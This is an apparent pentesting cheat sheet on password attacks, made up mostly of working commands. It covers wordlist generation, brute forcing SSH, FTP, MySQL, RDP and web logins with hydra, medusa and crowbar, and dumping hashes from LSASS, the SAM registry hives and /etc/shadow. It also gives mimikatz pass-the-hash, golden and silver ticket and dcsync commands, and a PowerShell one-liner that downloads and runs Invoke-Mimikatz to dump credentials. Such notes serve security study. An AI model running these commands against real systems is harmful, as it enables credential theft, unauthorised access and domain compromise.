<h1 align="center">Password Attacks</h1>

- **World-list Generation**

- **Password Cracking**

  - **Passive online Attack:** No Bruteforcing just MITM and sniffing with tools like Ettercap & cain & adel

  - **Active online Attack:** occurs in Exploitation phase to attack service running in the target

  - **Offline Attack:** occurs in post Exploitation after gaining access to the victim pc

  - **Non Electric:** social Engineering and Shoulder Surfing

- **John vs hashcat**

- **Mimikatz**

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

- <h2 align="center">World-list Generation</h2>

    -   **Crunch tool**

        -   Crunch \[min\] \[max\] \[characters\] --o \[output file\]

        -   Crunch 4 6 abcdefg123 --o pass.txt

            -   -\> generate a combination of pass with 4-6 characters with the specified letters

        -   **Generate password list with specific pattern**

            -   , =\> upper

            -   @ =\> lower

            -   \^ =\> special char

            -   \% =\> number

            -   Crunch 8 8 -t ,@@@@\^%% -o pass.txt

    -   **CEWL tool**

	-   Generate a world-list about the target from given URL by searching in the site's words and metadata
       
        -   Cewl --help

        -   Cewl -w pass.txt \[url\]

        -   Cewl -m 5 -w pass.txt \[url\]

            -   -m = with minimum nb of char of 5

        -   Cewl -d 1 -m 5 \--with-numbers -v -w passcewl.txt \[url\]

    -   **CUPP tool**

        -   **Cup --I :** make a world list that has a relation to the target by enter some info about him and answer given questions by the app in the interactive mode

    -   **John the ripper**

        -   John --worldlist=pass.txt --rules=wordlist/single --stdout \>john.txt

        -   john \--wordlist= pass.txt \--rules=wordlist \--stdout \> john1.txt

        -   john \--wordlist= pass.txt \--rules=single \--stdout \> john2.txt

        -   Generate custom rule :

            -   nano /etc/john/john.conf && Search on \"list.rules:wordlist\"

            -   \[List.Rules:MYOWN\]

            -   c\^\[0-9\]\$\[0-9\]\$\[0-9\]

            -   <https://www.openwall.com/john/doc/RULES.shtml> -\> rules manual

            -   john \--wordlist= pass.txt \--rules=MYOWN \--stdout \> john1.txt

    -   **Built-in world-lists**

        -   **Rockyou World-list**

            -   cd /usr/share/wordlists/ && gzip -d rockyou.txt.gz

        -   **We can download worldlists online such as : darkcOde , Rockyou**

        -   **Offline world-lists in Linux in "usr/share"**

        -   **Apt install seclists**  -\> has a lot of useful worldlists

        -   **Fuzzdb wordlists 	  -\>** git clone <https://github.com/fuzzdb-project/fuzzdb.git>


- <h2 align="center">PASSWORD CRACKING</h2>

    -   **Passive online attack**

        -   Cain & adel

        -   Ettercap

    -   **Active online attack**

        -   **Guessing**

        -   **Try Default passwords**

        -   **ThcHydra**

            -   hydra -V -P pass.txt 192.168.1.244 snmp

            -   hydra -V -L users.txt -P pass.txt -t 20 192.168.1.104 ftp  -\>default 16 thread

            -   hydra -V -L users.txt -P pass.txt -t 10 192.168.1.104 ssh

            -   hydra -V -L users.txt -P pass.txt -t 10 192.168.1.104 mysql

            -   hydra -V -L users.txt -p \"\" -t 10 192.168.1.104 mysql

            -   hydra -V -L users.txt -P pass.txt -t 10 192.168.1.104 telnet

            -   hydra -V -L users.txt -P pass.txt -t 20 192.168.43.20
                http-post-form
                \"/login.php:username=\^USER\^&password=\^PASS\^&Login=Login:Login failed\"

                -   username=\^USER\^ specify field for username

                -   password=\^PASS\^ specify field for password

                -   -P specifies name of password list

                -   -L specifies name of username list

                -   -s to specify port 

                -   &login=login  specify Log In button

        -   **Medusa**

            -   Medusa \[-h host\|-H file\] \[-u username\|-U file\] \[-p password\|-P file\] \[-C file\] -M protocol

            -   medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp

            -   medusa -u user -P passwords.txt -t 10 -h 192.168.0.2 -e ns -F -M mssql -n 1433                

            -   medusa -u root -P passwords.txt -t 10 -h 192.168.0.2 -e ns -F -M {ssh, ftp }

                -   Suppose on scanning the target network I found SSH
                    is running port 2222 instead of 22 so we can specify a port nb by **--n** { --M ssh --n 2222 }       

                -   Using option **-e along with ns **will try null password and password as username while making brute force attack

                -   Stop after first valid username/password found then you can use **-f option**.     

        -   **Ncrack**

            -   ncrack -vv \--user \[User\] -P passwd.txt \[protocol\]://\[IP\]

            -   ncrack -U user.txt -P pass.txt \[ip\]:\[port\_nb\]

            -   ncrack -U user.txt -P pass.txt \[ip\]:\[port\_nb\] --T 4   -\> increase speed

            -   ncrack -U user.txt -P pass.txt \[ip\]:\[port\_nb\] --f     -\> stop on success

        -   **Patator** -\> very fast and based on modules

            -   Patator --h

            -   Patator \[module\] -\> list module options

            -   Patator \[module\] host=\[ip\] user=\[user\] password=\[file.txt\]

        -   **Crowbar**

            -   perform password attacks on network protocols good for rdp and ssh key attack

            -   apt-get install crowbar

            -   crowbar -b \[protocol\] -s \[ip\] -u \[user\] -n  \[wordlist\] -n \[nb of threats\]  

            -   crowbar -b rdp -s 192.168.1.4 -u admin -c /password.txt -n 15

            -   Arguments

                -   -t : threads

                -   -e ns : n=no password, s: password same as user

                -   -F : stop after success

    -   **Offline attack**

        -   **Extract the Hashes**

            -   **Meterpreter :**

                -   Hashdump

                -   Load kiwi

                    -   creds\_all

                -   Load mimikatz

            -   **Pwdump**

                -   Pwdump7.exe

                -   Pwdump7.exe -o outputfile.txt

                -   Pwdump7 SYSTEM SAM \> /root/sam.txt

            -   **Fgdump**

                -   Fgdump.exe -\> dump local pc

                -   Fgdump.exe --h 192.168.1.4 --u adminuser

                    -   dump remote pc using this user

                -   Fgdump.exe --h 127.0.0.1 --u adminuser

                    -   dump local pc using this user

            -   **Sandump2**

                -   samdump2 SYSTEM SAM -o sam.txt

            -   **Mimikatz**

                -    privilege::debug 

                -   Log

                -   sekurlsa::logonpasswords

            -   **Lazagne**

                -   Lazagne.exe \[module\]

                -   Lazagne.exe all

            -   **Procdump**

                -   procdump.exe -accepteula -ma lsass.exe lsass.dmp

                -   mimikatz -\> privilege::debug 

                -   mimikatz -\> sekurlsa::minidump lsass.dmp

                -   mimikatz -\> sekurlsa::logonPasswords

            -   **WCE.exe**

                -   wce.exe -l -\> dump login hashes.

                -   wce.exe -w -\> dump clear text login passwords.

            -   **From registry without tools**

                -   C:\\\> reg.exe save hklm\\sam
                    c:\\windows\\temp\\sam.save

                -   C:\\\> reg.exe save hklm\\security
                    c:\\windows\\temp\\security.save

                -   C:\\\> reg.exe save hklm\\system
                    c:\\windows\\temp\\system.save

            -   **Responder**

            -   **Cat /etc/shadow (in linux)**

                -   unshadow passwd.txt shadow.txt \> unshadowed.txt

        -   **Identify the Hashes**

            -   Hashid \[hash\]

            -   Hash-identifier

        -   **Crack the Hash**

            -   Hashcat

            -   john

    -   **Non Electric**

        -   **social Engineering and Shoulder Surfing**

<h2 align="center">JOHN THE RIPPER VS HASHCAT </h2>

" While John the Ripper is a great tool for cracking password hashes, its speed is limited to the power of the CPUs dedicated to the task. In
recent years, Graphic Processing Units (GPUs) have become incredibly powerful and are, of course, found in every computer with a display.
High-end machines, like those used for video editing and gaming, ship with incredibly powerful GPUs. GPU-cracking tools like Hashcat586
leverage the power of both the CPU and the GPU to reach incredible password cracking speeds. "

-   **John :**

    -   john \--list=formats

    -   john \--format=md5crypt hashes.txt -\> md5 \$1

    -   john \--format=sha256crypt hashes.txt -\> sha-256 \$5

    -   john \--format=sha512crypt hashes.txt -\> sha-512 \$6

    -   john \--format=LM hashes.txt -\>LM

    -   john \--format=NT hashes.txt -\>NT

    -   John \--format=raw-MD5 hashes.txt -\> normal md5

    -   john \--wordlist=/usr/share/wordlists/rockyou.txt \--format=raw-MD5 hashes.txt

    -   john \--rules \--wordlist=/usr/share/wordlists/rockyou.txt \--format=raw-MD5 hashes.txt

    -   John file.txt

    -   **Notes :**

        -   \--fork : option engages multiple processes to make use of more CPU cores on a single machine

        -   \--node : splits the work across multiple machines

-   **Hashcat :**

    -   hashcat -m {5600} -a {0} {hash.txt} {/usr/share/wordlists/rockyou.txt} -\> Dictionary mode

    -   hashcat -m 5600 -a 3 hash.txt -\> Bruteforce mode

    -   hashcat -m 500 /root/hashMD5.txt  /usr/share/wordlists/rockyou.txt -\> Dictionary mode

    -   hashcat -m 1800 linux\_hashes /usr/share/wordlists/rockyou.txt     -\> Dictionary mode

    -   **Notes :**

        -   Hash type =\> -m

            -   Find hashes nb in : <https://hashcat.net/wiki/doku.php?id=example_hashes>

            -   NTLM = 1000

            -   SHA-256 = 1400

            -   SHA-512 = 1200

            -   MD4 = 900

            -   MD5 = 0

        -   Crackmode =\> -a

            -   Dictionary mode == 0

            -   Brute Force mode == 3

        -   Brute force with pattern

            -   ?d == digit

            -   ?l == lower letter

            -   ?u == capital letter

            -   ?s == special char

            -   ?a == all characters

            -   hashcat -m 5600 -a 3 hash.txt ?a?a?a

            -   hashcat -m 5600 -a 3 hash.txt -i ?a?a?a?a?a?a

            -   hashcat -m 5600 -a 3 hash.txt ?u?l?l?l?l?s?d?d

        -   \--force: This option forces hashcat to run even when no GPU devices are found, this is useful to run Hashcat inside the virtual machine

        -   The first filename is always the file to crack, and the next one is the dictionary to use

        -   hashcat.potfile  : has all hashes that was cracked

        -   \--username: This tells Hashcat that the input file contains not only hashes but also usernames; it Expects the "username: hash "format


- <h2 align="center">Mimikatz</h2>

    -   **What is mimikatz**

        -   Mimikatz is an open-source application that allows users to view and save authentication credentials like **Kerberos
            tickets** and password hashes

        -   After a user logs on, a variety of credentials are generated  and stored in the Local Security Authority Subsystem
            Service,LSASS and process in memory. This is meant to facilitate single  sign-on (SSO) ensuring a user isn't prompted each time
            resource access is requested. The credential data may include Kerberos tickets, NTLM password hashes, LM password
            and even clear-text passwords (to support WDigest and SSP authentication among others, though in order to prevent the
            "clear-text" password from being placed in LSASS, the following registry key needs to be set to "0" (Digest Disabled):

        -   Encrypted user passwords (passwords, instead of hashes) are stored in the OS memory, and, to be more specific,
            in LSASS.EXE process memory miimkatz extratct these password from the memory

    -   **Credential gathering techniques :**

        -   Extracting passwords from memory

        -   **Pass-the-Hash:** Windows used to store password data in an NTLM
            hash Attackers use Mimikatz to pass that exact hash string to the target computer to login. Attackers don't even need to crack
            the password, they just need to use the hash string as is. 

        -   **Pass-the-Ticket:** Newer versions of windows store password data in a construct called a ticket.  Mimikatz
            provides functionality for a user to pass a kerberos ticket to another computer and login with that user's ticket. It's basically the same as pass-the-hash otherwise.

        -   **Over-Pass the Hash (Pass the Key):** same as  the pass-the-hash, but this technique passes a unique key to
            impersonate a user you can obtain from a domain controller.

        -   **Kerberos Golden Ticket:** This is a pass-the-ticket attack, but it's a specific ticket for a hidden account
            called KRBTGT, which is the account that encrypts all of the other tickets. A golden
            ticket gives you domain admin credentials to any computer on the network that doesn't expire.

        -   **Kerberos Silver Ticket:** Another pass-the-ticket that makes it easy for you to use services on the network.
            Kerberos grants a user a TGS ticket, and a user can use that  ticket to log into any services on the network. Microsoft
            doesn't always check a TGS after it's issued, so it's easy  to slip it past any safeguards.

        -   **Pass-the-Cache:** Finally an attack that doesn't take advantage of Windows! A pass-the-cache attack is generally
            the same as a pass-the-ticket, but this one uses the saved and encrypted login data on a Mac/UNIX/Linux system

        -   Extracting certificates and their private keys.

    -   **Mimikatz modules**

        -   **The sekursla module** : in Mimikatz lets you dump
            passwords from memory. To use the commands in the sekurlsa  module, you must have Admin or SYSTEM permissions.

        -   **The crypto module** : allows you to access the CryptoAPI
            in Windows which lets you list and export certificates and
            their private keys, even if they're marked as non-exportable.

        -   **The kerberos module** : accesses the Kerberos API so you
            can play with that functionality by extracting and manipulating Kerberos tickets

        -   **The service module :** allows you to start, stop, disable, etc. Windows services.

    -   **Mimikatz general**

        -   Instruction format : Modulename::commandName arguments,

        -   privilege::debug

            -   will allow us to interact with a process owned by
                another account  .elevates permissions for Mimikatz to  get to the debug privilege

        -   log

            -   To record a log of Mimikatz interactions and results 
                The default log file is mimikatz.log, but you can specify another log file name

        -   log customlogfilename.log

            -   to log in a different file

    -   **Mimikatz Sekurlsa module**

        -   sekurlsa::logonpasswords

        -   sekurlsa::logonPasswords full

            -   -\> to dump the credentials of all logged-on users ntlm passwords from memory

        -   sekurlsa::tickets /export

            -   -\> Display tickets in memory

        -   sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:{NTLM\_hash} /run:cmd

        -   sekurlsa::ekeys -\>ekeys

        -   sekurlsa::dpapi -\>dpapi

        -   sekurlsa::minidump lsass.dmp -\>minidump

        -   sekurlsa::Kerberos

            -   -\> Dump hashes, Kerberos passwords of authenticated users / services / computers

        -   sekurlsa::krbtgt

            -   -\> Dump the hashes of the Kerberos service accounts (krbtgt)

        -   sekurlsa:: trust / patch 

            -   -\> Dump the LSA server the relationships between  domains and their trustkeys

    -   **Mimikatz Kerberos module**

        -   kerberos::list

            -   (== klist from a terminal) -\> Display kerberos tickets in memory

        -   kerberos::list /export

        -   kerberos::ptt c:\\chocolate.kirbi

        -   kerberos::golden /admin:administrateur /domain:example.local
            /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:{NTLM\_hash} /ticket:chocolate.kirbi

        -   kerberos::ptt Administrateur\@krbtgt-domain.LOCAL.kirbi -\>ptt

        -   kerberos::tgt    -\>tgt

        -   kerberos::purge -\> Delete kerberos tickets in memory

    -   **Mimikatz crypto Module**

        -   crypto::capi -\> Patch CryptoAPI to make keys exportable

        -   crypto::cng -\> Patch the LSASS KeyIso service to make the keys exportable

        -   crypto::certificates /export -\> Export certificates

        -   crypto::certificates /export /systemstore:CERT\_SYSTEM\_STORE\_LOCAL\_MACHINE

        -   crypto::keys /export

        -   crypto::keys /machine /export

    -   **Mimikatz Vault & lsadump**

        -   vault::cred

        -   vault::list

        -   token::elevate

        -   vault::cred

        -   vault::list

        -   lsadump::sam

        -   lsadump::secrets

        -   lsadump::cache

        -   token::revert

        -   lsadump :: dcsync     -\> Dump the hashes of the LSA server by posing as a DC

        -   lsadump::dcsync /user:domain\\krbtgt /domain:lab.local

    -   **Mimikatz pass the hash**

        -   sekurlsa::pth /user:Administrateur /domain:example.org /ntlm:{NTLM\_hash}

        -   sekurlsa::pth /user:Administrateur /domain:example.local /aes256:{aes\_key}

        -   sekurlsa::pth /user:Administrateur /domain:example.com /ntlm:{NTLM\_hash} /aes256: {aes\_key}

        -   sekurlsa::pth /user:Administrator /domain:example.local /ntlm:{NTLM\_hash} /run:cmd.exe

        -   sekurlsa::pth /user:Administrator /domain:IDENTITY /ntlm:{NTLM\_hash} /run:powershell

        -   Arguments Explanation:

            -   / user: the name of the account you want to usurp\
                / domain: FQDN of the domain or workgroup if you work outside domain\
                / rc4 or / ntlm: RC4 key or hash NTLM of the user password\
                / aes128 (optional): key AES128 derived from user  password and domain\
                / aes256 (optional): AES256 key derived from user  password and domain\
                / run (optional): command to be executed under this identity

    -   **Mimikatz golden ticket**

        -   kerberos::golden
            /domain:\<domain\_name\>/sid:\<domain\_sid\>
            /rc4:\<krbtgt\_ntlm\_hash\> /user:\<user\_name\> -\>golden tiket

        -   kerberos::golden
            /domain:\<domain\_name\>/sid:\<domain\_sid\>
            /rc4:\<ntlm\_hash\> /user:\<user\_name\> /service:\<service\_name\>
            /target:\<service\_machine\_hostname\> -\>silver ticket

        -   .\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME
            /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:{NTLM\_hash} /ptt

        -   kerberos::golden /user:utilisateur /domain:chocolate.local
            /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:
            {NTLM\_hash} /id:1107 /groups:513
            /ticket:utilisateur.chocolate.kirbi

        -   kerberos::golden /domain:chocolate.local
            /sid:S-1-5-21-130452501-2365100805-3685010670
            /aes256:{aes\_key}/user:Administrateur /id:500
            /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600
            /renewmax:10080

        -   kerberos::golden /admin:Administrator /domain:CTU.DOMAIN
            /sid:S-1-1-12-123456789-1234567890-123456789
            /krbtgt:{NTLM\_hash} /ticket:Administrator.kiribi

        -   .\\mimikatz \"kerberos::golden /admin:DarthVader
            /domain:[domain.org](http://rd.lab.adsecurity.org) /id:9999
            /sid:S-1-5-21-135380161-102191138-581311202
            /krbtgt:{NTLM\_hash}/startoffset:0 /endin:600
            /renewmax:10080 /ptt\" exit

        -   Arguments Explanation :

            -   / user: the name of the account you want to usurp, its
                existence is not compulsory.\
                / domain: FQDN of the domain\
                / sid: SID of the domain\
                / sids: Other SIDS (groups, users, DC in AD forest \...)
                that you want to spoof.\
                / groups: groups of which the user will be a member.\
                / krbtgt: NTLM hash of the domain KRBTGT account to
                encrypt and sign the ticket.\
                / ticket: (optional) path to a ticket\
                / ptt file : immediately injects the ticket into memory\
                / id (optional) id of the usurped user

    -   **Using mimikatz with meterpreter**

        -   *mimikatz\_command --f \[my\_command\]*

        -   *mimikatz\_command --f samdump::hashes -\>* must be admin

        -   mimikatz\_command -f sekurlsa::searchPasswords   -\>search passwords from memory

        -   mimikatz\_command -f sekurlsa::wdigest

        -   mimikatz\_command -f sekurlsa::logonPasswords full

        -   Msv

        -   Kerberos

    -   **Mimikatz with powershell**

        -   IEX (New-Object
            System.Net.Webclient).DownloadString(\`https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1\')
            ; Invoke-Mimikatz --DumpCreds

-   **General Notes**

    -   if  pc is a workgroup  passwords are saved locally on the machine in sam file
    -   if pc is in a domain password are stored locally and in domain controller
    -   Brute force zip files

        -   fcrackzip --u --D --p dictionary.txt zip\_file
    
    -   Hidden Files

        -   apt-get install steghide
        -   steghide embed -ef [file.txt] -cf [image.png]
        -   embed a file into an image
        -   steghide embed -ef [file.txt] -cf [image.png] -p [pass]
        -   embed a file with password protection
        -   steghide extract -sf [image.jpeg]
        -   extract a file from an image

